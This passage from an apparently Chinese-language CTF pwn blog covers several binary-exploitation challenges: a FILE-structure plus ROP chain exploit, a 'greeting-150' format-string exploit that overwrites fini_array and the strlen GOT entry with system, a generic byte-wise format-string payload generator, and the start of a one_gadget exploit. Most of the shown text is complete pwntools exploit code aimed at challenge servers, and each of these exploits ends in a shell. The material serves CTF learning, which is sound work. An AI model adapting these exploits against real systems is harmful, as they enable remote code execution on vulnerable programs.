    <span class="token comment" spellcheck="true">#leaking IO_buf_base</span>
    _IO_2_1_stdin_ <span class="token operator">=</span> libc_base <span class="token operator">+</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>
    _IO_buf_base <span class="token operator">=</span> _IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">7</span>
    li<span class="token punctuation">(</span><span class="token string">'_IO_buf_base'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#modify _IO_buf_base</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_buf_base<span class="token punctuation">)</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> <span class="token string">'%16$hhn'</span>
    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#build payload to modify _IO_2_1_stdin struct</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>_IO_2_1_stdin_ <span class="token operator">+</span> <span class="token number">0x83</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
    p <span class="token operator">+=</span> p64<span class="token punctuation">(</span>main_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>main_ret <span class="token operator">+</span> <span class="token number">0x8</span> <span class="token operator">*</span> <span class="token number">3</span><span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    sa<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#call getchar() make fp->_IO_read_ptr == fp->_IO_read_end</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">','</span><span class="token punctuation">)</span>
        sl<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span>

    <span class="token comment" spellcheck="true">#build rop chail</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    p <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span>
    sla<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#length:</span>
    sl<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#db()</span>

    <span class="token comment" spellcheck="true">#get shell</span>
    sla<span class="token punctuation">(</span><span class="token string">'>>'</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true">#io = exe.process()</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>

    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            lib <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre>
<h1 id="greeting-150"><a href="#greeting-150" class="headerlink" title="greeting-150"></a>greeting-150</h1><h3 id="保护"><a href="#保护" class="headerlink" title="保护"></a>保护</h3><pre class=" language-shell"><code class="language-shell">    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)</code></pre>
<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>字符串漏洞</p>
<p>源代码</p>
<pre class=" language-c++"><code class="language-c++">  char s; // [esp+1Ch] [ebp-84h]
  char v5; // [esp+5Ch] [ebp-44h]
  unsigned int v6; // [esp+9Ch] [ebp-4h]

  v6 = __readgsdword(0x14u);
  printf("Please tell me your name... ");
  if ( !getnline(&v5, 0x40) )
    return puts("Don't ignore me ;( ");
  sprintf(&s, "Nice to meet you, %s :)\n", &v5);
  return printf(&s); #字符串漏洞</code></pre>
<h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>由于程序中只有一个字符串漏洞, 执行字符串漏洞后结束,这时就需要覆盖fini_array为start函数进行再次执行程序同时修改strlen的got表为system plt地址.</p>
<p>简单介绍一下: fini_array, 在<code>main</code>函数前会调用<code>.init</code>段代码和<code>.init_arra</code>y段的函数数组中每一个函数指针。同样的，<code>main</code>函数结束后也会调用<code>.fin</code>i段代码和<code>.fini._arrary</code>段的函数数组中的每一个函数指针</p>
<h3 id="字符串漏洞设置大的值注意的地方"><a href="#字符串漏洞设置大的值注意的地方" class="headerlink" title="字符串漏洞设置大的值注意的地方"></a>字符串漏洞设置大的值注意的地方</h3><pre><code>hh 对于整数类型，printf期待一个从char提升的int尺寸的整型参数
h  对于整数类型，printf期待一个从short提升的int尺寸的整型参数</code></pre>
<ol>
<li>第一次%xc%hhn的时候，要扣掉前面摆放的address的长度。比如32位时，其前面会摆放4个地址，这个时候就是x需要减去4x4 = 16.</li>
<li>之后每个%xc 必需扣掉前一个写入 byte 的值总字符数才会是这个写入需要的长度。比如 第一次写入值为 90 第二个写入 120 此时应为<code>%30c% offset$hhn</code></li>
<li>当某一次写入的值比前面写入的要小的时候，就需要整数overflow回来。比如：需要写入的一个字节，用的是hhn的时候，前面那次写入的是0x80，这次写入的是0x50，这时候就用0x50可以加上0x100（256）=0x150 （这时候因为是hhn，在截取的时候就是截取的0x50）， 再减去0x80 =  0xD0（208），也就是填入%208c%offset$hhn即可</li>
</ol>
<p>单字节覆盖常用脚本(ctf-wiki):</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">fmt</span><span class="token punctuation">(</span>prev<span class="token punctuation">,</span> word<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># prev: payload 长度,  word: 单个字符, index: 偏移地址 + i</span>
    <span class="token keyword">if</span> prev <span class="token operator">&lt;</span> word<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#若payload长度小于单个字符的值时</span>
        result <span class="token operator">=</span> word <span class="token operator">-</span> prev
        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span> <span class="token comment" spellcheck="true">#直接写入差值,补齐</span>
    <span class="token keyword">elif</span> prev <span class="token operator">==</span> word<span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#若payload长度等于单个字符的值时</span>
        result <span class="token operator">=</span> <span class="token number">0</span> <span class="token comment" spellcheck="true">#不写</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true">#若payload长度大于单个字符的值时</span>
        result <span class="token operator">=</span> <span class="token number">256</span> <span class="token operator">+</span> word <span class="token operator">-</span> prev  <span class="token comment" spellcheck="true">#通过单个字符溢出来打</span>
        fmtstr <span class="token operator">=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"c"</span>
    fmtstr <span class="token operator">+=</span> <span class="token string">"%"</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>index<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"$hhn"</span> <span class="token comment" spellcheck="true">#添加自payload</span>
    <span class="token keyword">return</span> fmtstr


<span class="token keyword">def</span> <span class="token function">fmt_str</span><span class="token punctuation">(</span>offset<span class="token punctuation">,</span> size<span class="token punctuation">,</span> addr<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">""</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> size <span class="token operator">==</span> <span class="token number">4</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#32位将要覆盖的地址</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>addr <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#64位将要覆盖的地址</span>
    prev <span class="token operator">=</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#获取payload长度</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token comment" spellcheck="true">#传入,payload长度, 目标字节, 偏移</span>
        payload <span class="token operator">+=</span> fmt<span class="token punctuation">(</span>prev<span class="token punctuation">,</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span><span class="token punctuation">,</span> offset <span class="token operator">+</span> i<span class="token punctuation">)</span>
        prev <span class="token operator">=</span> <span class="token punctuation">(</span>target <span class="token operator">>></span> i <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0xff</span>
    <span class="token keyword">return</span> payload

<span class="token comment" spellcheck="true">#fmt_str(12, 4, exe.got['strlen'], exe.plt['system'])</span>
<span class="token triple-quoted-string string">'''
其中每个参数的含义基本如下
    offset表示要覆盖的地址最初的偏移
    size表示机器字长
    addr表示将要覆盖的地址。
    target表示我们要覆盖为的目的变量值。
'''</span></code></pre>
<p>通过上面的介绍, 根据以上脚本写字符串漏洞原理写exp</p>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'i386'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#context(arch = 'amd64', os = 'linux', log_level='debug')</span>

exeFile  <span class="token operator">=</span> <span class="token string">"greeting-150"</span>
libFile  <span class="token operator">=</span> <span class="token string">""</span>

remoteIp <span class="token operator">=</span> <span class="token string">"111.198.29.45"</span>
remotePort <span class="token operator">=</span> <span class="token number">46553</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">0</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>

<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">'... '</span><span class="token punctuation">)</span>

    strlen_got <span class="token operator">=</span> exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'strlen'</span><span class="token punctuation">]</span>
    <span class="token comment" spellcheck="true"># ELF Termination Funciton Talbe</span>
    <span class="token comment" spellcheck="true"># strlen_got 0x08049a54</span>
    fini_array <span class="token operator">=</span> <span class="token number">0x08049934</span>
    start_addr <span class="token operator">=</span> <span class="token number">0x080484F0</span>
    system_plt <span class="token operator">=</span> <span class="token number">0x08048490</span>

    <span class="token comment" spellcheck="true"># 'Nice to meet you, %s:)' + str</span>
    <span class="token comment" spellcheck="true"># offset 12</span>
    offset <span class="token operator">=</span> <span class="token number">12</span>
    prelen <span class="token operator">=</span> len<span class="token punctuation">(</span><span class="token string">'Nice to meet you, '</span><span class="token punctuation">)</span>

    li<span class="token punctuation">(</span><span class="token string">'strlen_got: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'fini_array: '</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span><span class="token punctuation">)</span>

    p <span class="token operator">=</span> <span class="token string">'AA'</span> <span class="token comment" spellcheck="true">#aliament</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>fini_array <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span>

    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>strlen_got<span class="token punctuation">)</span>
    p <span class="token operator">+=</span> p32<span class="token punctuation">(</span>fini_array<span class="token punctuation">)</span>
    <span class="token comment" spellcheck="true">#modify highword(strlen_got)</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x0804</span> <span class="token operator">-</span> <span class="token number">0x12</span> <span class="token operator">-</span> prelen<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>
    <span class="token comment" spellcheck="true">#modify highword(fini_arry_addr)</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>

    <span class="token comment" spellcheck="true">#modify lowword(system_plt)</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x8490</span> <span class="token operator">-</span> <span class="token number">0x804</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>
    <span class="token comment" spellcheck="true">#modify lowword(fini_plt)</span>
    p <span class="token operator">+=</span> <span class="token string">'%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span><span class="token number">0x84F0</span> <span class="token operator">-</span> <span class="token number">0x8490</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'c%'</span> <span class="token operator">+</span> str<span class="token punctuation">(</span>offset <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'$hn'</span>

    sl<span class="token punctuation">(</span>p<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">finish</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ia<span class="token punctuation">(</span><span class="token punctuation">)</span>
    c<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Main-----------------------------</span>
<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>

    <span class="token keyword">if</span> LOCAL<span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span>env <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"LD_PRELOAD"</span> <span class="token punctuation">:</span> libFile<span class="token punctuation">}</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            io <span class="token operator">=</span> exe<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token punctuation">)</span>


    <span class="token keyword">else</span><span class="token punctuation">:</span>
        exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span>exeFile<span class="token punctuation">)</span>
        io <span class="token operator">=</span> remote<span class="token punctuation">(</span>remoteIp<span class="token punctuation">,</span> remotePort<span class="token punctuation">)</span>
        <span class="token keyword">if</span> LIBC<span class="token punctuation">:</span>
            libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span>libFile<span class="token punctuation">)</span>

    exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>
    finish<span class="token punctuation">(</span><span class="token punctuation">)</span>

</code></pre>
<h1 id="One-Gadget"><a href="#One-Gadget" class="headerlink" title="One Gadget"></a>One Gadget</h1><p>one-gadget 是glibc里调用<code>execve(&#39;/bin/sh&#39;, NULL, NULL)</code>的一段非常有用的gadget。在我们能够控制ip（也就是pc）的时候，用one-gadget来做RCE（远程代码执行）非常方便，比如有时候我们能够做一个任意函数执行，但是做不到控制第一个参数，这样就没办法调用<code>system(&quot;sh&quot;)</code>，这个时候one gadget就可以搞定了</p>
<p>使用one_gadget工具进行获取oen_gadget</p>
<p>one_gadget工具安装:</p>
<p>github: <a target="_blank" rel="noopener" href="https://github.com/david942j/one_gadget">https://github.com/david942j/one_gadget</a></p>
<pre class=" language-shell"><code class="language-shell">sudo apt install ruby
sudo apt install gem
sudo gem install one_gadget</code></pre>
<p>通过ida查看伪代码</p>
<pre class=" language-C++"><code class="language-C++">  void (*v4)(void); // [rsp+8h] [rbp-18h]
  void (*v5)(void); // [rsp+10h] [rbp-10h]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  init(*(_QWORD *)&argc, argv, envp);
  printf("Give me your one gadget:");
  __isoc99_scanf("%ld", &v4);
  v5 = v4;
  v4();</code></pre>
<p>思路: 通过init打印出printf在libc中的地址, 然后计算libc基地址, 使用one_gadget打shell</p>
<p>exp如下:</p>
<pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true">#-*- coding:utf-8 -*-</span>

<span class="token comment" spellcheck="true"># Author: I0gan</span>
<span class="token comment" spellcheck="true"># Team  : D0g3</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#from LibcSearcher import LibcSearcher</span>

<span class="token comment" spellcheck="true">#context.log_level='debug'</span>
<span class="token comment" spellcheck="true">#context.terminal = ['konsole', '-x', 'bash', 'c']</span>
<span class="token comment" spellcheck="true">#context.terminal = 'konsole'</span>
<span class="token comment" spellcheck="true">#context(arch = 'i386', os = 'linux', log_level='debug')</span>
context<span class="token punctuation">(</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">,</span> os <span class="token operator">=</span> <span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>

exeFile  <span class="token operator">=</span> <span class="token string">"one_gadget"</span>
libFile  <span class="token operator">=</span> <span class="token string">"./libc-2.29.so"</span>

remoteIp <span class="token operator">=</span> <span class="token string">"node3.buuoj.cn"</span>
remotePort <span class="token operator">=</span> <span class="token number">26163</span>

LOCAL <span class="token operator">=</span> <span class="token number">0</span>
LIBC  <span class="token operator">=</span> <span class="token number">1</span>

r   <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
ra  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvall<span class="token punctuation">(</span><span class="token punctuation">)</span>
rl  <span class="token operator">=</span>  <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
ru  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span>
sl  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
sa  <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
sla <span class="token operator">=</span>  <span class="token keyword">lambda</span> x<span class="token punctuation">,</span> y <span class="token punctuation">:</span> io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span> y<span class="token punctuation">)</span>
ia  <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
c   <span class="token operator">=</span>  <span class="token keyword">lambda</span> <span class="token punctuation">:</span> io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
pd32  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p32<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#python3 not surport str + bytes</span>
pd64  <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> p64<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>
li    <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>x<span class="token punctuation">)</span>
db    <span class="token operator">=</span> <span class="token keyword">lambda</span>   <span class="token punctuation">:</span> gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">#--------------------------Func-----------------------------</span>


<span class="token comment" spellcheck="true">#--------------------------Exploit--------------------------</span>
<span class="token keyword">def</span> <span class="token function">exploit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    ru<span class="token punctuation">(</span><span class="token string">'0x'</span><span class="token punctuation">)</span>
    print_addr <span class="token operator">=</span> int<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
    li<span class="token punctuation">(</span><span class="token string">'print_addr:'</span> <span class="token operator">+</span> hex<span class="token punctuation">(</span>print_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
    lib_base <span class="token operator">=</span> print_addr <span class="token operator">-</span> lib<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span>
    one_gadget <span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0xe237f</span><span class="token punctuation">,</span><span class="token number">0xe2383</span><span class="token punctuation">,</span><span class="token number">0xe2386</span><span class="token punctuation">,</span><span class="token number">0x106ef8</span><span class="token punctuation">]</span>

